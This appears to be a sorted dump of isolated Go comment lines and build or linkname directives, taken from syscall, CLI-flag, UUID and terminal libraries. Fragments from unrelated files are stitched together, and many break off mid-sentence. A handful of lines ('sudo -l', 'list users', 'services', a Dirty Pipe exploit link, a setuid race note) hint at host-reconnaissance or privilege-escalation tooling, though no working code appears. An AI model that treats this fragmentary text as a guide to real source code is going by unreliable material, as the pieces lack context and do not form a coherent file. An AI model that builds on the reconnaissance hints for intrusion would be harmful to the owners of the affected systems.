// is set to a file path) and optionally prints to stderr.
// is set to a file path) and to stderr.
// issue 1435.
// it can be used as a scan destination:
// it must be of the form  xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
// just do nothing
// kernel uses 
// kernels still require 32-bit aligned access to network
// ktrace
// lchflags
// lchmod
// ld compares two strings and returns the levenshtein distance between them.
// length is not zero.
// let the logic continue to see if ValidArgsFunction needs to be called.
// lets you read back the array of integers form.
// lflags contains local flags.
// lfs_bmapv
// lfs_markv
// lfs_segclean
// lfs_segwait
// lgetxattr
// license that can be found in the LICENSE file.
// limit completions for the named flag to directory names.
// limit completions for the named flag to the specified file extensions.
// limitations under the License.
// line is the current line being entered.
// line of a command when printing help or generating docs
// line.
// lines and generates system call stubs.
// linux variant.
// linux/if_pppox.h causes some declaration conflicts with other
// linux/if_pppox.h. We're defining this by hand here instead of
// lio_listio
// list current user 
// list users
// listxattr
// llistxattr
// loadLibraryEx wraps the Windows LoadLibraryEx function.
// loaded from system32.
// local flags because we can use a local flag on a parent command
// localNonPersistentFlags are used to stop the completion of subcommands when one is set
// lock for reading and writing from flagCompletionFunctions
// lock protects the terminal and the state in this object from
// longer supported on darwin.
// look up the flag that will also be translated. So it would be possible to create
// loop for parts to find the first difference
// loops here (instances watching each other) and return ELOOP.
// lot of unsafe.Pointer casts to use properly.
// lremovexattr
// lseek
// lsetxattr
// lutimes
// machines.
// madvise
// majmin returns major and minor version number for an OpenBSD system.
// make copies to retain order of the original slices
// manifest semantics but is affected by the application compatibility layer.
// manually using unix.Syscall.
// maps or compared directly.
// maxLine is the greatest value of cursorY so far.
// maxlen 
// may be empty if the terminal doesn't support them.
// may be re-used repeatedly with subsequent Write and Read operations.
// may improve the UUID generation throughput significantly.
// meanings of bits 0-15 or wasting time and space shifting bits 16-31 for
// means the immediately previous entry.
// mergePersistentFlags merges c.PersistentFlags() to c.Flags()
// messages.
// messages. Using this flag will also print the given usageMessage.
// mincore
// minherit
// minor components.
// missing parts (1.0 => 1.0.0) will be made into a canonicalized form
// mixed
// mkerrors.sh
// mkerrors.sh -Wall -Werror -static -I/tmp/include
// mkerrors.sh -Wall -Werror -static -I/tmp/include -fsigned-char
// mkerrors.sh -Wall -Werror -static -I/tmp/include -m32
// mkerrors.sh -Wall -Werror -static -I/tmp/include -m64
// mkerrors.sh -m32
// mkerrors.sh -m64
// mkerrors.sh -maix32
// mkerrors.sh -maix64
// mkerrors.sh -marm
// mksysnum_plan9.sh /opt/plan9/sys/src/libc/9syscall/sys.h
// mmap varies by architecture
// mmap2 also requires arguments to be passed in a struct
// modctl
// mode and returns the previous state of the terminal so that it can be
// mount
// mountpoint is always a full path and starts with a '/'
// move left by a word.
// move right by a word.
// moveCursorToPos appends data to t.outBuf which will move the cursor to the
// mq_close
// mq_getattr
// mq_notify
// mq_open
// mq_receive
// mq_send
// mq_setattr
// mq_timedreceive
// mq_timedsend
// mq_unlink
// mquery
// mremap
// msgctl
// msgget
// msgrcv
// msgsnd
// much of the functionality can be written directly in Go.
// mustFind is like Find but panics if search fails.
// mustLoad is like Load but panics if search fails.
// name_to_handle_at (see NameToHandleAt) and open_by_handle_at (see
// need to be shown in the usage/help default template under 'available commands'.
// need to write a newline so that our cursor can be
// net api calls
// net.IPMask.String() actually outputs things like ffffff00
// network
// new file descriptor referring to the same directory.
// new persistent flags of all parents.
// nfssvc
// nnpfspioctl
// no completion is provided.
// non-boolean and flags without a 'no option default value'
// non-boolean flags
// non-inherited flags.
// non-negative integer that is returned by the prctl syscall.
// not consistent with Bash completion. It has therefore been disabled.
// not hidden or deprecated.
// not need to be closed.
// not needed for binaries built for Windows.
// not pointer width.
// not trigger file completions.
// not valid.  The NodeID is only well defined for version 1 and 2 UUIDs.
// ntp_adjtime
// number and m is a hex digit of the minor number. This is backward compatible
// number below and a pointer to an array of uintptr.
// nwmConnEntry constants
// nwmFilter constants
// nwmHeader constants
// object name from one format to another.
// objects and to control the ability of the user to perform various
// obtain the same behavior but only for flags.
// of Iovec (each of which represents a buffer) instead of a single buffer.
// of OpenBSD the syscall is called sysctl instead of __sysctl.
// of __<prefix>_go_custom_completion
// of a trailing tab when there are no description following it.
// of a version.
// of bytes written (returning an error if there is insufficient space in the
// of calling Getdirentries or ReadDirent repeatedly.
// of compared constraints.
// of id are used.  If id is less than 6 bytes then false is returned and the
// of openbsd/386 the syscall is called sysctl instead of __sysctl.
// of openbsd/amd64 the syscall is called sysctl instead of __sysctl.
// of openbsd/arm the syscall is called sysctl instead of __sysctl.
// of strings by giving the slice the methods of Value
// of that group required so that the shell completion suggests them automatically
// of the latter because they have doubled every full line.
// of the network device specified by ifname.
// of the network device specified by ifreq.Name.
// offs2lohi splits offs into its lower and upper unsigned long. On 64-bit
// offset of fd. See issue 
// on the executable from explorer.exe
// one of:
// one. The kernel expects SID to be in network byte order.
// only BTPROTO_L2CAP and BTPROTO_RFCOMM can accept connections
// only be 32 bytes.
// only be called when there is no possibility that New or any other
// optional arguments arg2 through arg5 depending on option. It returns a
// optional interface to indicate boolean flags that can be
// or 0 if a signal with such name is not found.
// or SetNodeInterface then it will be set automatically.  If the NodeID cannot
// or an error will be returned.
// or any program that uses CommandLineToArgv.
// or blank if there is no prerelease data.
// or deprecated.
// or the timeout has been exceeded. It will return how many
// or was overestimating.
// order of their arguments.
// order to achieve different styles of text.
// os info:
// osVersionInfoSize member. Disassembling ntdll.dll indicates
// other native functions.
// others do not. Work around this by subtracting the leading
// otherwise
// otherwise attempts to parse
// otherwise ignore 
// outBuf contains the terminal data to be sent.
// outWriter is a writer defined by the user that replaces stdout
// output. See the netdevice(7) man page for details.
// outputDesc field is filled by EZBNMIF4 on success
// overriding
// p.proc = proc
// pToEpollEvt converts 16 bit poll event bitfields to 32-bit epoll event fields.
// package.
// padding-register for alignment on ARM.
// parent is a parent command for this command.
// parentsPflags is all persistent flags of cmd's parents.
// parse boolean values into slice
// parse ip values into slice
// parsing cannot fail as the reader/writer are simply for local strings
// partial sequence. It's not clear how one should find the end of a
// particularly useful when testing.
// passing the integer value directly.
// passwordReader is an io.Reader that reads from a specific file descriptor.
// pasteActive is true iff there is a bracketed paste operation in
// path.
// payload of the passed data length occupies.
// pbit16 copies the 16-bit number v to b in little-endian order and returns the remaining slice of b.
// pbit32 copies the 32-bit number v to b in little-endian order and returns the remaining slice of b.
// pbit64 copies the 64-bit number v to b in little-endian order and returns the remaining slice of b.
// pbit8 copies the 8-bit number v to b and returns the remaining slice of b.
// peIntToExt converts a cgo portEvent struct into the friendlier PortEvent
// pflags contains persistent flags.
// places.
// pledgeAvailable checks for availability of the pledge(2) syscall
// pmc_control
// pmc_get_info
// point
// pollts
// populate stat
// pos is the logical position of the cursor in line
// position specifies the offset within the extended attribute. In the
// pp.Addrtype.
// pre-release.
// preadv
// preadv/pwritev chose this calling convention so they don't need to add a
// preserved if it were cast into the byte array of a raw ifreq.
// press is processed normally. Otherwise it returns a replacement line
// previous hash state. Read always reads the current state.
// previous state.
// printers
// privileges. The system uses the token to control access to securable
// process executed on behalf of the user has a copy of the token.
// process with TOKEN_QUERY access. It is a real token that needs to be closed.
// processes
// profil
// program. It will continue to function but will not show up in help or usage
// progress.
// prompt is a string that is written at the start of each input line (i.e.
// protocol (https://en.wikipedia.org/wiki/SAE_J1939). For more information
// pselect
// pset_assign
// pset_create
// pset_destroy
// ptrace
// pushing terminal driver STREAMS modules as per pts(7)
// pwritev
// queue appends data to the end of t.outBuf
// quotactl
// r1
// r2
// r2 is not used. Always set to 0
// race condition immediately after setting setuid
// random clock sequence is generated the first time a clock sequence is
// randomBits completely fills slice b with random data.
// range of data conveyed in value from the file associated with the file
// range of data conveyed in value to the file associated with the file
// rasctl
// read flag arguments with CSV parser
// readInt returns the size-bytes unsigned integer in native byte order at offset off.
// readLine().
// readPasswordLine also ignores any 
// readPasswordLine reads from reader until it finds 
// readdir_r
// reading lines of input.
// reads until it finds 
// readv
// reboot
// receive at least one normal byte
// recompute all lengths
// reference to the cookie around until the event is processed
// reflect.SliceHeader and reflect.StringHeader without introducing
// reflection.
// release the shared memory if we can't find the size
// remainder contains the remainder of any partial key sequences after
// remainder of the line.
// remove all quote characters
// remove the flag name argument from the list of finalArgs or else the parsing
// removexattr
// renameat
// reported upstream.
// requires the flag name to be complete
// restarting is O(n
// restore the terminal after a signal.
// restored.
// restrictions.
// result on the Go heap.
// result shares underlying state. Use Openat to make a really
// return an error - execpromises is not available before 6.3
// return the current NewUUID returns nil and an error.
// return true on the first found available 'help' sub command
// return true on the first found available (non deprecated/help/hidden)
// returned by Context after one of these functions has been called.
// returned does not include the 
// returning an error.
// returning nil if none exists.
// returning the remaining slice of b..
// returns the error.
// returns the file descriptors.
// returns the same results.
// rfork
// root directory of the access token t user's profile.
// rpad adds padding to the right of a string.
// s is now at least 36 bytes long
// sa_enable
// sa_preempt
// sa_register
// sa_setconcurrency
// sa_stacks
// sa_yield
// same code as pty_darwin.go
// same everywhere else) until the mips64 generator issue is fixed.
// sbrk
// sched_yield
// screen buffer. See
// search Windows System directory for the DLL if name is
// secret is written to the provided buffer and the returned size is the number
// see /usr/include/sys/ptms.h
// see /usr/include/sys/stropts.h
// see /usr/include/sys/termios.h
// see Parse for required string format
// see if there are any ArgAliases that should be completed.
// see linux/net.h
// see:
// see: https://dirtypipe.cm4all.com/
// self-relative security descriptor object allocated on the Go heap.
// semconfig
// semget
// semop
// send at least one normal byte
// sendfile
// services
// setcontext
// setfsgid(2) will return a non-nil error only if its caller lacks CAP_SETUID capability
// setfsgid(2) will return a non-nil error only if its caller lacks CAP_SETUID capability.
// setgroups
// setitimer
// setsockopt
// setxattr
// shared memory identifier id.
// shmat
// shmctl
// shmdt
// shmget
// should be impossible to get here as we always declare a help
// should be used as file extension filters.
// should be used with a given socket.
// should not be part of the list of arguments
// sigaction
// sigaltstack
// sigpending
// sigprocmask
// sigreturn
// sigsuspend
// similar to aliases but only suggests.
// size CTL_MAXNAME
// size contains the number of elements in the ring.
// size is guaranteed to be 
// size so ensure we deal with that.
// slice and string implementations.
// so that versions can be sorted.
// so we don't need to deal with it here.
// so write a horrible parser for that as well  :-(
// sockcmsg_dragonfly.go
// socket associated with fd at the given socket level.
// socket to filter incoming packets.  See 'man 7 socket' for usage information.
// socketcall assembly to avoid allocation on every system call.
// somehow Iovec.Base on illumos is (
// sortFlags returns the flags as a slice in lexicographical sorted order.
// source address is only specified if the socket is unconnected
// space between indent i and end of line width w into which
// spaces.
// special case above)
// specified by id.
// specified by which.
// specified file extensions.
// split both pre releases for analyse their parts
// split into high / low
// sstk
// stRingBuffer is a ring buffer of strings.
// start of the next word.
// start of the previous word.
// statvfs1
// streamsPush pushes STREAMS modules if not already done so.
// string for a flag and returns it and the un-quoted usage.
// string.
// struct flock is packed on z/OS. We can't emulate that in Go so
// structure used to uniquely identify users or groups.
// structure) which are not hidden or deprecated.
// sub command
// sub commands
// subsystem.
// subsystem. The Type and Name fields specify which type of hash or cipher
// sudo -l
// supplied name space and data.  It is the same as calling:
// swapctl
// sysLinger is the real system call structure.
// sysarch
// syscall
// syscall entry
// syscall expects a NULL-terminated string.
// syscall interface implementation for other packages
// syscall needs to be called twice
// syscall_
// syscall_bsd.go or syscall_unix.go.
// syscall_solaris.go or syscall_unix.go.
// sysctlmib translates name to mib number and appends any additional args.
// system-modified data
// system-related operations on the local computer.
// system. If you want godoc to display OS documentation for another
// system. If you want godoc to display documentation for another
// system. If you want godoc to display syscall documentation for another
// systems by fcntl_linux_32bit.go to be SYS_FCNTL64.
// systems that have KB2533623 installed. To determine whether the
// t.lock must be held at this point
// t.remainder is a slice at the beginning of t.inBuf
// template generation.
// terminator still exists within the length.
// than that of time.Time values.  So if t is out of the valid range of
// that are not hidden.
// that encompasses the entire string (which allows the caller to
// that go along with 'unknown command' messages.
// that have set DisableFlagParsing
// that need to be shown in the usage/help default template under 'additional help
// that since it is the default behavior anyway.  Let's ignore this annotation
// that support them
// that the documentation is indeed correct about that.
// that the returned line consists only of pasted data. Programs may wish to
// that the user has entered.
// that we can use on every pflag set and children commands
// the 6-argument calls like sendto and recvfrom. Instead the
// the FlagSet
// the current line is 0.
// the current process. It is a pseudo token that does not need
// the current thread. It is a pseudo token that does not need
// the directory being edited underfoot.
// the domain Org or on non-POSIX systems is site defined.
// the end of any wrapped line.
// the error. The error will be guaranteed to contain windows.Errno.
// the expression
// the extra added -- is counted as arg.
// the flag from newSet will be ignored.
// the flag name to be complete
// the flag set is CommandLine.
// the full input line and the current position of the cursor (in
// the hash digest instead of creating a new one for a given chunk and finalizing it.
// the key and the remainder of the input. Otherwise it returns utf8.RuneError.
// the manuals for the appropriate operating system.
// the more common 
// the new socket.
// the next line instead.
// the path is not a symlink or junction but another type of reparse
// the performance loss is negligible.
// the primary group of any objects created by a process using this access token.
// the promise of compatibility.
// the pty receives a window size change notification.
// the random number generator on demand in batches. Enabling the pool
// the same pre release!
// the syscall returns ENOMEM in case the actual value
// the termios(3) manpage.
// the these symbols are loaded by the system linker and are required to
// the unsafe version would be (
// the user hasn't requested/received it yet.
// the value specified by arg and passes a dummy pointer to bufp.
// them here for backwards compatibility.
// then a map of each flag name and whether it is set or not.
// there are any positional args that are not in the 
// there are not exactly N positional args OR
// these functions.
// these structures. We just include them copied from <bits/termios.h>.
// this command or an empty string if the command has not been called.
// this flag will also print the given usageMessage.
// this means Other had the lower specificity
// those packages rather than this one if you can.
// threxit
// thrsigdivert
// thrsleep
// thrwakeup
// timer_create
// timer_delete
// timer_getoverrun
// timer_gettime
// timer_settime
// to '>0.2' it is 
// to Pointer. The caller must obey the unsafe.Pointer rules while
// to automatically enable in CLI tools.
// to be closed.
// to be uninterpreted fixed-size binary blobs -- but
// to be uninterpreted fixed-size binary blobs--but
// to consider the rounding error.
// to freebsd and $GOARCH to arm.
// to register a Go function which will work across all shells.
// to retrieve arbitrary-length data.
// to see if Path or Fd was the event source. The other will be
// to the length provided in the structure.
// to the same file as where the completion script prints its logs.
// to the user.
// to this command (local and persistent declared here and by all parents).
// to valid line data. It indicates that bracketed paste mode is enabled and
// to write the later checks
// topics'.
// treat name as mountpoint
// trim terminating 
// trivially stub this ourselves.
// two different forks are versioned differently
// undelete
// under a terminal server.
// underlying call to port_create(3c).
// unified device property model.
// uninitialized.
// unveil calls is handled by UnveilBlock.
// update max lengths
// updateParentsPflags updates c.parentsPflags by adding
// urn:uuid:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
// urn:uuid:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx are decoded as well as the
// usageFunc is usage func defined by user.
// usageTemplate is usage template defined by user.
// use TIOCSPTLCK with a pointer to zero to clear the lock
// use the Ifreq.withData method.
// used as input to mksyscall which parses the //sys
// used with %v formatting directives.
// using Bind before the CAN socket can be used.
// using the HCI protocol.
// using the L2CAP protocol.
// using the RFCOMM protocol.
// using the specified flags.
// utf16ToBuf function reinterprets []uint16 as []byte
// utrace
// uuid.  The time is only defined for version 1 and 2 UUIDs.
// uuidgen
// vadvise
// validateFlagGroups validates the mutuallyExclusive/requiredAsGroup logic and returns the
// validating the name does not exceed IFNAMSIZ-1 (trailing NULL required)
// value of 1. A bug in the Go Solaris syscall interface
// values.
// variable BASH_COMP_DEBUG_FILE to the path of some file to be used.
// variable.  It has the format <PROGRAM>_ACTIVE_HELP where <PROGRAM> is the name of the
// versionTemplate is the version template defined by user.
// vfork
// visualLength returns the number of visible glyphs in s.
// we can add methods to it.
// we can move back to the beginning and repaint everything.
// we can return what we found.
// we can't just use the basep passed in. See 
// we do not want to lose arg in this case
// we may have cap of old less than size of dirent_freebsd11.
// we should delete it from our map. We can still return ENOENT to the caller.
// we should wrap the text.
// we still have some buffer to flush
// we suggest it as a completion
// weird race condition when running an image that was just built - sleeping for a second solves it
// what package os and others expect.
// when a -- was found during args parsing.
// when the third argument is an integer.
// when writing a character. But that doesn't happen
// where instead of ECONNABORTED error socket
// whether it was launched from explorer.exe
// which parses the //sys lines and generates system call stubs.
// which to search.  The BashCompSubdirsInDir annotation can be used to
// will be fixed to change variable type as suitable.
// will be printed by generating docs for this command.
// will result in
// will silently write 2 words farther than we specify
// will still scan the name for a NUL but only
// wincrypt.h
// windows api calls
// windows hook
// winuser.h
// with Setsockopt and Getsockopt.
// with a tab at the end (or else zsh will show a -- following it
// with a terminating NUL and any bytes after the NUL removed.
// with blanks. Initializing with blanks allows the caller to feed in either
// with both 
// with netinet/in.h). Given that we only need a single zero constant
// with prefix
// with the possibility of straddling an invalid page.
// with the same base segments.
// withData produces an ifreqData with the pointer p set for ioctls which require
// without a controlling terminal.
// would confuse the Go garbage collector.
// wrap it in our own nicer implementation.
// wrapping and turning into two. This causes the prompt on
// wrapping)
// writeWithCRLF writes buf to w but replaces all occurrences of 
// writev
// writing a character (except a new line) that causes
// xtob converts hex characters x1 and x2 into a byte.
// xvalues returns the value of a byte as a hexadecimal digit or 255.
// xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
// xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
// you may not use this file except in compliance with the License.
// you to define the usage and description as part of your command
// zero values for CAN_RAW and CAN_BCM sockets as they have no meaning.
// ztypes generation.
// {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
// }
//-------------------------------------------------------------------
//--unknown
//--unknown (args will be empty)
//--unknown --next-flag ...
//--unknown --next-flag ... (args will be --next-flag ...)
//--unknown arg ... (args will be arg ...)
//Only the first two fields of Rusage are set
//clearsyscall.Errno() // TODO(mundaym): check pre-emption rules.
//extern gettimeofday
//go:build !aix 
//go:build !go1.12
//go:build !go1.5
//go:build !linux 
//go:build !windows
//go:build !windows 
//go:build (386 
//go:build (aix 
//go:build (darwin 
//go:build (freebsd 
//go:build (linux 
//go:build (mips 
//go:build 386
//go:build 386 
//go:build aix
//go:build aix 
//go:build amd64
//go:build amd64 
//go:build arm
//go:build arm 
//go:build arm64
//go:build arm64 
//go:build armbe 
//go:build darwin
//go:build darwin 
//go:build dragonfly
//go:build dragonfly 
//go:build freebsd
//go:build freebsd 
//go:build gc
//go:build gccgo 
//go:build generate
//go:build go1.12
//go:build go1.13
//go:build go1.5
//go:build illumos 
//go:build ios
//go:build linux
//go:build linux 
//go:build loong64
//go:build loong64 
//go:build mips 
//go:build mips64 
//go:build mips64le 
//go:build mipsle 
//go:build netbsd
//go:build netbsd 
//go:build openbsd
//go:build openbsd 
//go:build plan9
//go:build plan9 
//go:build ppc 
//go:build ppc64
//go:build ppc64 
//go:build ppc64le
//go:build ppc64le 
//go:build riscv 
//go:build riscv64 
//go:build s390x
//go:build s390x 
//go:build solaris
//go:build solaris 
//go:build sparc64 
//go:build windows
//go:build windows 
//go:build zos 
//go:generate go run golang.org/x/sys/windows/mkwinsyscall -output zsyscall_windows.go eventlog.go service.go syscall_windows.go security_windows.go setupapi_windows.go
//go:linkname libc_accept libc_accept
//go:linkname libc_acct libc_acct
//go:linkname libc_bind libc_bind
//go:linkname libc_chdir libc_chdir
//go:linkname libc_chroot libc_chroot
//go:linkname libc_close libc_close
//go:linkname libc_connect libc_connect
//go:linkname libc_dup libc_dup
//go:linkname libc_dup2 libc_dup2
//go:linkname libc_exit libc_exit
//go:linkname libc_faccessat libc_faccessat
//go:linkname libc_fchdir libc_fchdir
//go:linkname libc_fchmod libc_fchmod
//go:linkname libc_fchmodat libc_fchmodat
//go:linkname libc_fchown libc_fchown
//go:linkname libc_fchownat libc_fchownat
//go:linkname libc_fcntl libc_fcntl
//go:linkname libc_fdatasync libc_fdatasync
//go:linkname libc_fstat libc_fstat
//go:linkname libc_fstatat libc_fstatat
//go:linkname libc_fstatfs libc_fstatfs
//go:linkname libc_fsync_range libc_fsync_range
//go:linkname libc_ftruncate libc_ftruncate
//go:linkname libc_getcwd libc_getcwd
//go:linkname libc_getdirent libc_getdirent
//go:linkname libc_getegid libc_getegid
//go:linkname libc_geteuid libc_geteuid
//go:linkname libc_getgid libc_getgid
//go:linkname libc_getgroups libc_getgroups
//go:linkname libc_getpeername libc_getpeername
//go:linkname libc_getpgid libc_getpgid
//go:linkname libc_getpgrp libc_getpgrp
//go:linkname libc_getpid libc_getpid
//go:linkname libc_getppid libc_getppid
//go:linkname libc_getpriority libc_getpriority
//go:linkname libc_getrlimit libc_getrlimit
//go:linkname libc_getrusage libc_getrusage
//go:linkname libc_getsid libc_getsid
//go:linkname libc_getsockname libc_getsockname
//go:linkname libc_getsockopt libc_getsockopt
//go:linkname libc_getsystemcfg libc_getsystemcfg
//go:linkname libc_gettimeofday libc_gettimeofday
//go:linkname libc_getuid libc_getuid
//go:linkname libc_ioctl libc_ioctl
//go:linkname libc_kill libc_kill
//go:linkname libc_lchown libc_lchown
//go:linkname libc_listen libc_listen
//go:linkname libc_lseek libc_lseek
//go:linkname libc_lstat libc_lstat
//go:linkname libc_madvise libc_madvise
//go:linkname libc_mkdir libc_mkdir
//go:linkname libc_mkdirat libc_mkdirat
//go:linkname libc_mkfifo libc_mkfifo
//go:linkname libc_mknod libc_mknod
//go:linkname libc_mknodat libc_mknodat
//go:linkname libc_mlock libc_mlock
//go:linkname libc_mlockall libc_mlockall
//go:linkname libc_mmap64 libc_mmap64
//go:linkname libc_mprotect libc_mprotect
//go:linkname libc_msync libc_msync
//go:linkname libc_munlock libc_munlock
//go:linkname libc_munlockall libc_munlockall
//go:linkname libc_munmap libc_munmap
//go:linkname libc_nanosleep libc_nanosleep
//go:linkname libc_nrecvmsg libc_nrecvmsg
//go:linkname libc_nsendmsg libc_nsendmsg
//go:linkname libc_open64 libc_open64
//go:linkname libc_openat libc_openat
//go:linkname libc_pause libc_pause
//go:linkname libc_pipe libc_pipe
//go:linkname libc_poll libc_poll
//go:linkname libc_posix_fadvise64 libc_posix_fadvise64
//go:linkname libc_pread64 libc_pread64
//go:linkname libc_pselect libc_pselect
//go:linkname libc_pwrite64 libc_pwrite64
//go:linkname libc_read libc_read
//go:linkname libc_readlink libc_readlink
//go:linkname libc_recvfrom libc_recvfrom
//go:linkname libc_renameat libc_renameat
//go:linkname libc_select libc_select
//go:linkname libc_sendto libc_sendto
//go:linkname libc_setdomainname libc_setdomainname
//go:linkname libc_setgid libc_setgid
//go:linkname libc_setgroups libc_setgroups
//go:linkname libc_sethostname libc_sethostname
//go:linkname libc_setpgid libc_setpgid
//go:linkname libc_setpriority libc_setpriority
//go:linkname libc_setregid libc_setregid
//go:linkname libc_setreuid libc_setreuid
//go:linkname libc_setrlimit libc_setrlimit
//go:linkname libc_setsid libc_setsid
//go:linkname libc_setsockopt libc_setsockopt
//go:linkname libc_settimeofday libc_settimeofday
//go:linkname libc_setuid libc_setuid
//go:linkname libc_shutdown libc_shutdown
//go:linkname libc_socket libc_socket
//go:linkname libc_socketpair libc_socketpair
//go:linkname libc_splice libc_splice
//go:linkname libc_stat libc_stat
//go:linkname libc_statfs libc_statfs
//go:linkname libc_statx libc_statx
//go:linkname libc_sync libc_sync
//go:linkname libc_syslog libc_syslog
//go:linkname libc_time libc_time
//go:linkname libc_times libc_times
//go:linkname libc_truncate libc_truncate
//go:linkname libc_umask libc_umask
//go:linkname libc_umount libc_umount
//go:linkname libc_uname libc_uname
//go:linkname libc_unlink libc_unlink
//go:linkname libc_unlinkat libc_unlinkat
//go:linkname libc_ustat libc_ustat
//go:linkname libc_utime libc_utime
//go:linkname libc_utimensat libc_utimensat
//go:linkname libc_utimes libc_utimes
//go:linkname libc_wait4 libc_wait4
//go:linkname libc_write libc_write
//go:linkname procAccess libc_access
//go:linkname procAdjtime libc_adjtime
//go:linkname procChdir libc_chdir
//go:linkname procChmod libc_chmod
//go:linkname procChown libc_chown
//go:linkname procChroot libc_chroot
//go:linkname procClose libc_close
//go:linkname procCreat libc_creat
//go:linkname procDup libc_dup
//go:linkname procDup2 libc_dup2
//go:linkname procExit libc_exit
//go:linkname procFaccessat libc_faccessat
//go:linkname procFchdir libc_fchdir
//go:linkname procFchmod libc_fchmod
//go:linkname procFchmodat libc_fchmodat
//go:linkname procFchown libc_fchown
//go:linkname procFchownat libc_fchownat
//go:linkname procFdatasync libc_fdatasync
//go:linkname procFlock libc_flock
//go:linkname procFpathconf libc_fpathconf
//go:linkname procFstat libc_fstat
//go:linkname procFstatat libc_fstatat
//go:linkname procFstatvfs libc_fstatvfs
//go:linkname procFsync libc_fsync
//go:linkname procFtruncate libc_ftruncate
//go:linkname procGetcwd libc_getcwd
//go:linkname procGetdents libc_getdents
//go:linkname procGetegid libc_getegid
//go:linkname procGeteuid libc_geteuid
//go:linkname procGetgid libc_getgid
//go:linkname procGetpgid libc_getpgid
//go:linkname procGetpgrp libc_getpgrp
//go:linkname procGetpid libc_getpid
//go:linkname procGetppid libc_getppid
//go:linkname procGetpriority libc_getpriority
//go:linkname procGetrlimit libc_getrlimit
//go:linkname procGetrusage libc_getrusage
//go:linkname procGetsid libc_getsid
//go:linkname procGettimeofday libc_gettimeofday
//go:linkname procGetuid libc_getuid
//go:linkname procKill libc_kill
//go:linkname procLchown libc_lchown
//go:linkname procLink libc_link
//go:linkname procLstat libc_lstat
//go:linkname procMadvise libc_madvise
//go:linkname procMkdir libc_mkdir
//go:linkname procMkdirat libc_mkdirat
//go:linkname procMkfifo libc_mkfifo
//go:linkname procMkfifoat libc_mkfifoat
//go:linkname procMknod libc_mknod
//go:linkname procMknodat libc_mknodat
//go:linkname procMlock libc_mlock
//go:linkname procMlockall libc_mlockall
//go:linkname procMprotect libc_mprotect
//go:linkname procMsync libc_msync
//go:linkname procMunlock libc_munlock
//go:linkname procMunlockall libc_munlockall
//go:linkname procNanosleep libc_nanosleep
//go:linkname procOpen libc_open
//go:linkname procOpenat libc_openat
//go:linkname procPathconf libc_pathconf
//go:linkname procPause libc_pause
//go:linkname procReadlink libc_readlink
//go:linkname procRename libc_rename
//go:linkname procRenameat libc_renameat
//go:linkname procRmdir libc_rmdir
//go:linkname procSelect libc_select
//go:linkname procSetegid libc_setegid
//go:linkname procSeteuid libc_seteuid
//go:linkname procSetgid libc_setgid
//go:linkname procSethostname libc_sethostname
//go:linkname procSetpgid libc_setpgid
//go:linkname procSetpriority libc_setpriority
//go:linkname procSetregid libc_setregid
//go:linkname procSetreuid libc_setreuid
//go:linkname procSetrlimit libc_setrlimit
//go:linkname procSetsid libc_setsid
//go:linkname procSetuid libc_setuid
//go:linkname procStat libc_stat
//go:linkname procStatvfs libc_statvfs
//go:linkname procSymlink libc_symlink
//go:linkname procSync libc_sync
//go:linkname procSysconf libc_sysconf
//go:linkname procTimes libc_times
//go:linkname procTruncate libc_truncate
//go:linkname procUmask libc_umask
//go:linkname procUname libc_uname
//go:linkname procUnlink libc_unlink
//go:linkname procUnlinkat libc_unlinkat
//go:linkname procUstat libc_ustat
//go:linkname procUtime libc_utime
//go:linkname proc__major libc___major
//go:linkname proc__makedev libc___makedev
//go:linkname proc__minor libc___minor
//go:linkname proc__xnet_bind libc___xnet_bind
//go:linkname proc__xnet_connect libc___xnet_connect
//go:linkname proc__xnet_getsockopt libc___xnet_getsockopt
//go:linkname proc__xnet_llisten libc___xnet_llisten
//go:linkname proc__xnet_recvmsg libc___xnet_recvmsg
//go:linkname proc__xnet_sendmsg libc___xnet_sendmsg
//go:linkname proc__xnet_sendto libc___xnet_sendto
//go:linkname proc__xnet_socket libc___xnet_socket
//go:linkname proc__xnet_socketpair libc___xnet_socketpair
//go:linkname procaccept libc_accept
//go:linkname procaccept4 libc_accept4
//go:linkname procacct libc_acct
//go:linkname procfcntl libc_fcntl
//go:linkname procfutimesat libc_futimesat
//go:linkname procgetgroups libc_getgroups
//go:linkname procgethostname libc_gethostname
//go:linkname procgetmsg libc_getmsg
//go:linkname procgetpeername libc_getpeername
//go:linkname procgetsockname libc_getsockname
//go:linkname procioctl libc_ioctl
//go:linkname proclseek libc_lseek
//go:linkname procmmap libc_mmap
//go:linkname procmunmap libc_munmap
//go:linkname procpipe libc_pipe
//go:linkname procpipe2 libc_pipe2
//go:linkname procpoll libc_poll
//go:linkname procport_associate libc_port_associate
//go:linkname procport_create libc_port_create
//go:linkname procport_dissociate libc_port_dissociate
//go:linkname procport_get libc_port_get
//go:linkname procport_getn libc_port_getn
//go:linkname procpread libc_pread
//go:linkname procpreadv libc_preadv
//go:linkname procputmsg libc_putmsg
//go:linkname procpwrite libc_pwrite
//go:linkname procpwritev libc_pwritev
//go:linkname procread libc_read
//go:linkname procreadv libc_readv
//go:linkname procrecvfrom libc_recvfrom
//go:linkname procsendfile libc_sendfile
//go:linkname procsetgroups libc_setgroups
//go:linkname procsetsockopt libc_setsockopt
//go:linkname procshutdown libc_shutdown
//go:linkname procumount libc_umount
//go:linkname procutimensat libc_utimensat
//go:linkname procutimes libc_utimes
//go:linkname procwait4 libc_wait4
//go:linkname procwrite libc_write
//go:linkname procwritev libc_writev
//go:linkname syscall_getprocaddress syscall.getprocaddress
//go:linkname syscall_loadlibrary syscall.loadlibrary
//go:linkname syscall_rawSyscall syscall.rawSyscall
//go:linkname syscall_rawSyscall6 syscall.rawSyscall6
//go:linkname syscall_syscall syscall.syscall
//go:linkname syscall_syscall6 syscall.syscall6
//go:linkname syscall_syscall6X syscall.syscall6X
//go:linkname syscall_syscall9 syscall.syscall9
//go:linkname syscall_syscallPtr syscall.syscallPtr
//go:noescape
//go:uintptrescapes
//nolint:gosec // Expected unsafe pointer for Syscall call.
//sys
//sys   Chdir(path string) (err error) = SYS___CHDIR_A
//sys   Chroot(path string) (err error) = SYS___CHROOT_A
//sys   CryptAcquireCertificatePrivateKey(cert 
//sys   Gethostname(buf []byte) (err error) = SYS___GETHOSTNAME_A
//sys   Getpagesize() (pgsize int) = SYS_GETPAGESIZE
